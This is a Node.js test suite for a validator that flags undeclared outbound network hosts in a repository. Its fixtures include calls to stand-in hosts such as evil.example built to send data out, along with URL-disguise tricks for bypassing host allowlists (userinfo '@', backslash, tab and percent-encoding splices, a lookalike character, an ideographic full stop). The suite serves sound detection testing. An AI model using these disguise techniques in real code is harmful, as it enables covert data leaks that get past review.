const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { test } = require("node:test");

const { checkOutbound, collectHosts } = require("../scripts/validate-outbound.cjs");

// A throwaway repo shaped like this one. The validator reads the tree it is
// pointed at, so probing the real tree would mean editing tracked source — the
// hazard already caught once in test/openwiki-facts.test.js.
function fixture({ files = {}, hosts = [], ignored = [], readme = "" }) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "tt-outbound-"));
  for (const [relative, content] of Object.entries(files)) {
    const full = path.join(root, relative);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  fs.writeFileSync(
    path.join(root, "outbound-hosts.json"),
    JSON.stringify({ hosts, ignored_hosts: { hosts: ignored } }),
  );
  fs.writeFileSync(path.join(root, "README.md"), readme);
  return root;
}

const declared = (host, extra = {}) => ({
  host,
  from: "server",
  user_data: false,
  readme: false,
  purpose: "test",
  seen_in: ["src/a.js"],
  request_from: ["src/a.js"],
  ...extra,
});

test("the repo as committed has a complete outbound inventory", () => {
  assert.deepEqual(checkOutbound(), []);
});

test("a host reachable in an <img src> is caught, not just one inside fetch()", () => {
  // This is the defect that prompted the whole check. `ProjectUsagePanel` sent
  // the name of a repo you had checked out to GitHub — once through fetch(),
  // and once through an <img src> template literal. A call-site scan sees only
  // the first, which is the same blind spot that let it ship.
  const root = fixture({
    files: {
      "dashboard/src/Panel.jsx": 'export const A = () => <img src={`https://evil.example/${o}.png`} />;\n',
    },
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 1);
  assert.match(findings[0], /undeclared outbound host 'evil\.example'/);
  assert.match(findings[0], /dashboard\/src\/Panel\.jsx/);
});

test("dashboard/src is scanned, not only src", () => {
  // The audit that wrote the README table grepped `src/` and stopped there.
  // That omission is the reason this file exists, so it gets its own test.
  const root = fixture({
    files: { "dashboard/src/x.ts": 'const u = "https://only-in-dashboard.example/v1";\n' },
  });
  assert.ok(
    checkOutbound({ root }).some((f) => f.includes("only-in-dashboard.example")),
    "a host present only under dashboard/src must still be reported",
  );
});

test("a declared host that no longer exists in code is reported as stale", () => {
  const root = fixture({ hosts: [declared("gone.example")] });
  assert.ok(checkOutbound({ root }).some((f) => f.includes("no code references it")));
});

test("a user-data host missing from the README fails the build", () => {
  // The table is the promise. A host can be declared honestly in JSON and still
  // be invisible to the person reading the privacy section.
  const root = fixture({
    files: { "src/a.js": 'fetch("https://tracker.example/collect");\n' },
    hosts: [declared("tracker.example", { user_data: true, readme: true })],
    readme: "# TokenTracker\n\nNothing here mentions it.\n",
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 1);
  assert.match(findings[0], /README\.md does not mention 'tracker\.example'/);
  assert.match(findings[0], /carrying user data/);
});

test("a declared and documented host passes", () => {
  const root = fixture({
    files: { "src/a.js": 'fetch("https://ok.example/x");\n' },
    hosts: [declared("ok.example", { readme: true })],
    readme: "| Pricing | `ok.example` | server | why |\n",
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

test("test fixtures naming a host are not treated as outbound calls", () => {
  const root = fixture({
    files: { "src/a.test.js": 'assert.equal(url, "https://fixture-only.example/x");\n' },
  });
  assert.deepEqual(checkOutbound({ root }), [], "a URL in a test is not a destination");
  assert.equal(collectHosts({ root }).has("fixture-only.example"), false);
});

test("ignored_hosts covers loopback and non-network literals", () => {
  const root = fixture({
    files: { "src/a.js": 'const u = "http://localhost:7680"; const ns = "http://www.w3.org/2000/svg";\n' },
    ignored: ["localhost", "www.w3.org"],
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

test("an ignore entry cannot exempt more than the host it names", () => {
  // The escape hatch used to take URL prefixes and reduce them to their host,
  // so "https://github.com/BerriAI" silently exempted every github.com
  // reference. A field that looks narrow and is not is worse than no field.
  const root = fixture({
    files: { "dashboard/src/a.jsx": 'const u = `https://github.com/${owner}.png`;\n' },
    ignored: ["github.com/BerriAI"],
  });
  assert.ok(
    checkOutbound({ root }).some((f) => f.includes("undeclared outbound host 'github.com'")),
    "a path-shaped ignore entry must not exempt the host",
  );
});

test("a request from a file that only had permission to MENTION the host is caught", () => {
  // The exact bypass an independent QA pass demonstrated on the merged branch.
  // ProjectUsagePanel legitimately contains "https://github.com/" as a prefix it
  // strips off project_ref, so file-level seen_in listed it as declared — and
  // re-adding <img src={`https://github.com/${repo}.png`}> to that very file,
  // the original defect, passed the check built to prevent it.
  const root = fixture({
    files: {
      "dashboard/src/Allowed.jsx": 'fetch("https://shared.example/ok");\n',
      "dashboard/src/Mentions.jsx": [
        'const ref = raw.replace("https://shared.example/", "");',
        "const bad = <img src={`https://shared.example/${repo}.png`} />;",
        "",
      ].join("\n"),
    },
    hosts: [
      declared("shared.example", {
        seen_in: ["dashboard/src/Allowed.jsx", "dashboard/src/Mentions.jsx"],
        request_from: ["dashboard/src/Allowed.jsx"],
      }),
    ],
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 1, JSON.stringify(findings));
  assert.match(findings[0], /Mentions\.jsx:2 requests 'shared\.example'/);
});

test("request_from is enforced, so it cannot drift into decoration", () => {
  // Every seen_in list in the committed inventory is exact. They were
  // hand-written first and were wrong in six entries; the repo test above is
  // what surfaced that, and this one states the expectation directly.
  const root = fixture({
    files: { "src/a.js": 'const u = "https://x.example/1";\n' },
    hosts: [declared("x.example", { request_from: [] })],
  });
  assert.ok(
    checkOutbound({ root }).some((f) =>
      f.includes("no request_from, link_from or data_from entry covers"),
    ),
  );
});

// --- Half B ------------------------------------------------------------------

test("a runtime-built fetch target is caught where the file can reach outside", () => {
  // The host-literal scan cannot see `fetch(target.url)`. This is the half that
  // stops the first dynamically-built URL from walking through the gate.
  const root = fixture({
    files: {
      "dashboard/src/Bad.jsx": [
        'const BASE = "https://exfil.example";',
        "export const go = (p) => fetch(buildUrl(p));",
        "",
      ].join("\n"),
    },
    hosts: [declared("exfil.example", { seen_in: ["dashboard/src/Bad.jsx"], request_from: ["dashboard/src/Bad.jsx"] })],
  });
  const findings = checkOutbound({ root });
  assert.ok(
    findings.some((f) => f.includes("builds its target at runtime")),
    `expected the dynamic-target finding, got: ${JSON.stringify(findings)}`,
  );
});

test("a runtime-built fetch is left alone when the file names no external host", () => {
  // The local API modules pass their target as a variable — always
  // `new URL("/functions/...", window.location.origin)`. A rule that flagged
  // those would be deleted the first time it cried wolf, so it must not.
  const root = fixture({
    files: {
      "dashboard/src/lib/api.ts": [
        'const url = new URL(`/functions/${slug}`, window.location.origin);',
        "const r = await fetch(url.toString(), { cache: 'no-store' });",
        "",
      ].join("\n"),
    },
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

test("a host built by interpolation is resolved to its literal suffix", () => {
  // `img.src = `http://${token}-${i}.d.ip.net.coffee/pixel.gif`` is a real
  // browser request in IpCheckPage. A strict [a-zA-Z0-9._-]+ host pattern matches
  // nothing there, so that destination was invisible to the check that most
  // needed to see it — and the inventory described the host as server-only.
  const root = fixture({
    files: {
      "dashboard/src/Probe.jsx": "img.src = `http://${token}-${i}.probe.example/p.gif`;\n",
    },
  });
  assert.ok(
    checkOutbound({ root }).some((f) => f.includes("undeclared outbound host 'probe.example'")),
    "the literal suffix of an interpolated host must be reported",
  );
});

test("an unresolvable interpolated host is not invented", () => {
  // `http://${req.headers.host || "localhost"}` ends the match mid-expression.
  // Guessing from the remainder reports `req.headers.host` as a destination,
  // which is noise that trains people to ignore the check.
  const root = fixture({
    files: { "src/serve.js": 'const u = new URL(p, `http://${req.headers.host || "localhost"}`);\n' },
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

test("a comment is a mention; a clickable link needs link_from", () => {
  // Comments are recognised positionally. Links are NOT guessed at: real ones
  // appear as <a> split across lines, as named constants used later, and as props
  // threaded through components, and every heuristic for those is a guess whose
  // wrong answer exempts a real request. Declaring them is a visible diff.
  const root = fixture({
    files: {
      "dashboard/src/Doc.jsx": [
        "// See https://docs.example/guide for the format.",
        'const link = <a href="https://docs.example/guide">docs</a>;',
        "",
      ].join("\n"),
    },
    hosts: [
      declared("docs.example", {
        seen_in: ["dashboard/src/Doc.jsx"],
        request_from: [],
        link_from: [{ file: "dashboard/src/Doc.jsx", url: "https://docs.example/guide" }],
      }),
    ],
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

// --- Comments and waivers -----------------------------------------------------
// Two ways this control gets switched off: it cries wolf on ordinary code, or it
// hands out a permission wider than the one written down.

test("a URL in a TRAILING comment is a mention, not a request", () => {
  // Only line-LEADING comments were recognised, so a reference link after code
  // read as a request. That shape is common enough to be the likeliest source of
  // pressure to disable the whole check.
  const root = fixture({
    files: {
      "src/a.js": 'const x = 5; // see https://docs.example/issues/123\nmodule.exports = x;\n',
    },
  });
  assert.deepEqual(checkOutbound({ root }), []);
});

test("`//` inside a string is not a comment", () => {
  // The token the comment scanner looks for is the one every URL contains, so
  // string state has to be tracked. Get this wrong and the check exempts
  // everything it exists to catch.
  const findings = attack('const x = fetch("https://shared.example/x");');
  assert.ok(
    findings.some((f) => f.includes("shared.example")),
    `a plain fetch must still be a request: ${JSON.stringify(findings)}`,
  );
});

test("code after a CLOSED block comment on the same line is still a request", () => {
  // Comments are ranges, not a single start index. Treating the first `/*` as
  // "comment from here on" would exempt the live call that follows it.
  const findings = attack('/* note */ fetch("https://shared.example/x");');
  assert.ok(
    findings.some((f) => f.includes("shared.example")),
    `the call after the comment must survive: ${JSON.stringify(findings)}`,
  );
});

test("an unterminated /* comments out its own line and no more", () => {
  // A regex literal like /[/*]/ opens a block comment as far as this scanner is
  // concerned. Carrying that state across lines would silence the rest of the
  // file — a miss, the one direction this check must never fail in.
  const root = fixture({
    files: {
      "dashboard/src/a.jsx": [
        "const re = /[/*]/;",
        'const img = <img src="https://tracker.example/p.gif" />;',
        "",
      ].join("\n"),
    },
  });
  assert.ok(
    checkOutbound({ root }).some((f) => f.includes("tracker.example")),
    "the next line must still be scanned",
  );
});

test("a waiver covers the URL it names, not the file it sits in", () => {
  // The #100 shape: SkillDetailPanel.jsx holds a github.com link waiver and
  // already interpolates owner names, so "show skill-author avatars" — an <img
  // src> added beside the link — passed under a file-wide waiver. Pinning to the
  // literal makes the new string a diff in the inventory instead.
  const root = fixture({
    files: {
      "dashboard/src/Panel.jsx": [
        'const link = <a href="https://docs.example/guide">docs</a>;',
        "const avatar = <img src={`https://docs.example/${owner}.png`} />;",
        "",
      ].join("\n"),
    },
    hosts: [
      declared("docs.example", {
        seen_in: ["dashboard/src/Panel.jsx"],
        request_from: [],
        link_from: [{ file: "dashboard/src/Panel.jsx", url: "https://docs.example/guide" }],
      }),
    ],
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 1, JSON.stringify(findings));
  assert.ok(findings[0].includes("${owner}.png"), findings[0]);
});

test("every request to a host from one file is reported, not just the last", () => {
  // The request map was keyed by file, so a second call overwrote the first and
  // only one line was ever seen. With waivers pinned per URL, each occurrence has
  // to be matched on its own.
  const root = fixture({
    files: {
      "dashboard/src/Panel.jsx": [
        'fetch("https://docs.example/one");',
        'fetch("https://docs.example/two");',
        "",
      ].join("\n"),
    },
    hosts: [
      declared("docs.example", { seen_in: ["dashboard/src/Panel.jsx"], request_from: [] }),
    ],
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 2, JSON.stringify(findings));
  assert.ok(findings.some((f) => f.includes("/one")) && findings.some((f) => f.includes("/two")));
});

test("a pin that matches nothing is reported as a stale waiver", () => {
  // Left in place it is a live exemption waiting for a URL to drift back onto it.
  const root = fixture({
    files: { "dashboard/src/Panel.jsx": 'const link = <a href="https://docs.example/guide">d</a>;\n' },
    hosts: [
      declared("docs.example", {
        seen_in: ["dashboard/src/Panel.jsx"],
        request_from: [],
        link_from: [
          { file: "dashboard/src/Panel.jsx", url: "https://docs.example/guide" },
          { file: "dashboard/src/Panel.jsx", url: "https://docs.example/gone" },
        ],
      }),
    ],
  });
  const findings = checkOutbound({ root });
  assert.equal(findings.length, 1, JSON.stringify(findings));
  assert.ok(findings[0].includes("stale waiver"), findings[0]);
});

test("a bare filename is rejected as a waiver, not read as an unmatched pin", () => {
  // The old shape WAS the defect. It has to fail loudly rather than degrade into
  // a confusing "no such URL" message.
  const root = fixture({
    files: { "dashboard/src/Panel.jsx": 'const link = <a href="https://docs.example/guide">d</a>;\n' },
    hosts: [
      declared("docs.example", {
        seen_in: ["dashboard/src/Panel.jsx"],
        request_from: [],
        link_from: ["dashboard/src/Panel.jsx"],
      }),
    ],
  });
  assert.ok(
    checkOutbound({ root }).some((f) => f.includes("file-wide waiver")),
    "the old form must be named as the reason",
  );
});

// --- Evasion ------------------------------------------------------------------
// Written after adversarially attacking the check rather than only testing that
// it works. Three of these were live holes in the first cut of the sink model.

const shared = (extra = {}) => ({
  host: "shared.example",
  from: "browser",
  user_data: false,
  readme: true,
  purpose: "test",
  seen_in: ["dashboard/src/Ok.jsx", "dashboard/src/A.jsx"],
  request_from: ["dashboard/src/Ok.jsx"],
  link_from: [],
  ...extra,
});

function attack(source, hosts = [shared()]) {
  return checkOutbound({
    root: fixture({
      files: {
        "dashboard/src/Ok.jsx": 'fetch("https://shared.example/ok");\n',
        "dashboard/src/A.jsx": `${source}\n`,
      },
      hosts,
      readme: "shared.example evil.example",
    }),
  });
}

test("userinfo cannot disguise the real host as a permitted one", () => {
  // In `https://shared.example@evil.example/p.png` the browser goes to
  // evil.example; the part that looks permitted is attacker-chosen decoration.
  // Reading the left side reports a permitted host; refusing to parse hides the
  // request entirely. Both are wrong.
  const findings = attack('const x = <img src="https://shared.example@evil.example/p.png" />;');
  assert.ok(
    findings.some((f) => f.includes("evil.example")),
    `expected evil.example to be reported, got: ${JSON.stringify(findings)}`,
  );
});

test("a protocol-relative URL is a request", () => {
  // `//evil.example/p.png` inherits the page scheme and carries no scheme for a
  // https?:// pattern to match, so it was invisible.
  assert.ok(attack('const x = <img src="//evil.example/p.png" />;').some((f) => f.includes("evil.example")));
});

test("string surgery elsewhere on the line does not exempt a request", () => {
  // The mention test used to apply to the whole LINE, so putting the request
  // beside an unrelated `.includes(` or `.replace(` silenced it — a one-character
  // bypass of the check built to stop exactly this request.
  for (const source of [
    'if (k.includes("x")) el.innerHTML = `<img src="https://shared.example/${r}.png">`;',
    'const s = `<img src="https://shared.example/${r}.png">`.replace("a", "b");',
  ]) {
    assert.ok(
      attack(source).some((f) => f.includes("A.jsx") && f.includes("requests")),
      `not caught: ${source}`,
    );
  }
});

test("a URL that IS the argument of a string operation stays a mention", () => {
  // The counterpart. `raw.replace("https://shared.example/", "")` strips a prefix
  // off a stored value; flagging it would train people to ignore the check.
  assert.deepEqual(attack('const ref = raw.replace("https://shared.example/", "");'), []);
});

test("link_from covers a host the user clicks, and only where declared", () => {
  const asLink = shared({
    link_from: [{ file: "dashboard/src/A.jsx", url: "https://shared.example/releases/latest" }],
  });
  assert.deepEqual(attack('const RELEASES = "https://shared.example/releases/latest";', [asLink]), []);
  // The same file without the declaration is a request.
  assert.ok(attack('const RELEASES = "https://shared.example/releases/latest";').length > 0);
});

test("a backslash ends the authority, so userinfo cannot borrow a permitted name", () => {
  // WHATWG URL parsing treats `\` as `/`, so `https://evil.example\@github.com/p.png`
  // reaches evil.example and the rest is decoration. Splitting on "/" alone
  // resolved it to `github.com` — a DECLARED host. That is worse than a miss:
  // where the file has permission for github.com, the check reads green while
  // the request leaves for somewhere else. This repo already made the same
  // backslash assumption in the Host-header guard (issue 88).
  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
  const findings = attack('const x = <img src="https://evil.example\\@shared.example/p.png" />;', [permitted]);
  assert.ok(
    findings.some((f) => f.includes("evil.example")),
    `the real host must be reported, got: ${JSON.stringify(findings)}`,
  );
  // Scoped to the line under test: the fixture's other file legitimately
  // produces its own shared.example finding, which says nothing about parsing.
  assert.ok(
    !findings.some((f) => f.includes("A.jsx") && f.includes("'shared.example'")),
    "the borrowed name must not be what this line resolves to",
  );
});

test("a trailing dot does not hide a host", () => {
  // `other.example.` is a valid absolute FQDN that resolves identically. The
  // hostname shape test rejected the dot and returned null, so the request was
  // invisible rather than reported.
  assert.ok(attack('const x = <img src="https://other.example./p.png" />;').some((f) => f.includes("other.example")));
});

// --- Parser-level borrows -----------------------------------------------------
// The scanner reads SOURCE TEXT; the runtime reads the DECODED string, and WHATWG
// URL parsing then removes tab/LF/CR. Every hole this control has had shares that
// root cause, so each shape gets a test rather than a note.

test("an escaped control character cannot splice a permitted host", () => {
  // `fetch("https://api.github.com\\t.evil.example/x")` is
  // api.github.com.evil.example at runtime — verify with
  //   node -e 'console.log(new URL("https://a.example\\t.evil.example/").host)'
  // Reading the source text and splitting on the backslash gave `api.github.com`:
  // declared AND permitted, so the check read green while the request left for
  // the attacker. Worse than a miss.
  for (const escape of ["\\t", "\\u0009", "\\x09"]) {
    const findings = attack(`fetch("https://shared.example${escape}.evil.example/x");`, [
      shared({ request_from: ["dashboard/src/A.jsx"] }),
    ]);
    assert.ok(
      findings.some((f) => f.includes("shared.example.evil.example")),
      `${escape} spliced host not resolved: ${JSON.stringify(findings)}`,
    );
  }
});

test("a scheme with no slashes is still a request", () => {
  // The IP-check page sends WebRTC STUN binding requests to Google and
  // Cloudflare, disclosing the user's IP. `stun:` carries no `//` and appears in
  // no https literal, so a scheme-anchored http(s) pattern could not see it —
  // while the README certified "these hosts and no others".
  assert.ok(
    attack('const ice = [{ urls: "stun:stun.evil.example:19302" }];').some((f) =>
      f.includes("stun.evil.example"),
    ),
  );
});

test("the scheme match is case-insensitive but does not fire inside another token", () => {
  assert.ok(attack('const x = <img src="HTTPS://evil.example/p.png" />;').some((f) => f.includes("evil.example")));
  // `arn:aws:bedrock:...` contains `ws:` and was reported as a host called
  // `bedrock` — the noise that gets a check switched off.
  assert.deepEqual(attack('const arn = "arn:aws:bedrock:us-east-1:1:foundation-model/x";'), []);
});

test("an interpolated suffix pins only a real zone, never a bare TLD", () => {
  // `${sub}github.com` can resolve to the registrable `evilgithub.com`, so no pin.
  // `${src}.ai` pins nothing either — `ai` is the TLD itself, and a comment
  // illustrating a bad URL should not be reported as a destination.
  assert.deepEqual(attack('const u = `https://${sub}shared.example/x`;'), []);
  assert.deepEqual(attack("// fabricating `https://${src}.ai` resolves to unrelated domains"), []);
  // A boundary that IS a zone still pins.
  assert.ok(
    attack("img.src = `http://${token}-${i}.probe.evil.example/p.gif`;").some((f) =>
      f.includes("probe.evil.example"),
    ),
  );
});

test("data_from covers a host stored as a value and never fetched", () => {
  // A mock fixture's `project_ref` is neither a link nor a request. Without its
  // own category it lands on `link_from`, which is an UNCONDITIONAL waiver: once
  // a file is there, any future request to that host from it passed forever —
  // which is why both categories are now pinned to the URL rather than the file.
  const asData = shared({
    data_from: [{ file: "dashboard/src/A.jsx", url: "https://shared.example/${repo}" }],
  });
  assert.deepEqual(attack('const row = { project_ref: `https://shared.example/${repo}` };', [asData]), []);
});

test("percent-encoding in the authority cannot borrow a permitted host", () => {
  // `https://shared.example%2eevil.example/x` resolves to
  // shared.example.evil.example — a decoded dot is a valid host character:
  //   node -e 'console.log(new URL("https://a.example%2eevil.example/").host)'
  // The hostname shape test rejected the `%` and returned null, so the request
  // was silently green. Same source-text-versus-decoded-string root cause as the
  // escape splice, one encoding layer further out.
  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
  const findings = attack('fetch("https://shared.example%2eevil.example/x");', [permitted]);
  assert.ok(
    findings.some((f) => f.includes("shared.example.evil.example")),
    `percent-decoded host not resolved: ${JSON.stringify(findings)}`,
  );
});

test("a lookalike character cannot be stripped into a permitted host", () => {
  // `https://аapi.github.com` — the first `а` is Cyrillic. The runtime punycodes
  // it to xn--api-5cd.github.com; a `[^a-zA-Z0-9]` strip quietly removed it and
  // resolved to `api.github.com`, declared AND permitted. Green while it leaks.
  //
  // Six hand-rolled parsing rounds failed the same way, so host resolution now
  // defers to `new URL()` — the parser the runtime itself uses.
  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
  const findings = attack('fetch("https://аshared.example/x");', [permitted]);
  assert.ok(
    findings.some((f) => f.includes("xn--")),
    `punycode host not reported: ${JSON.stringify(findings)}`,
  );
});

test("an ideographic full stop is a label separator", () => {
  // U+3002 is normalised to "." by WHATWG, so `shared.example。evil.example`
  // resolves to shared.example.evil.example.
  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
  assert.ok(
    attack('fetch("https://shared.example。evil.example/x");', [permitted]).some((f) =>
      f.includes("evil.example"),
    ),
  );
});

test("interpolation in the path leaves the host literal", () => {
  // `https://evil.example/${owner}.png` has a resolvable authority. Testing the
  // whole string for `${` sent every such URL down the pin path, where it
  // resolved to nothing — a silent miss on the commonest shape there is.
  assert.ok(
    attack("const x = <img src={`https://evil.example/${owner}.png`} />;").some((f) =>
      f.includes("evil.example"),
    ),
  );
});

test("a regex literal stripping a URL prefix is not a destination", () => {
  // `repoInput.replace(/^https:\/\/github\.com\//, "")` is string surgery on user
  // input. The `/^` between `replace(` and the URL hid that, and the escaped
  // slashes then resolved to a bare `github` — a demand to declare a host that
  // does not exist.
  assert.deepEqual(
    attack('const raw = repoInput.trim().replace(/^https:\\/\\/shared\\.example\\//, "");'),
    [],
  );
});
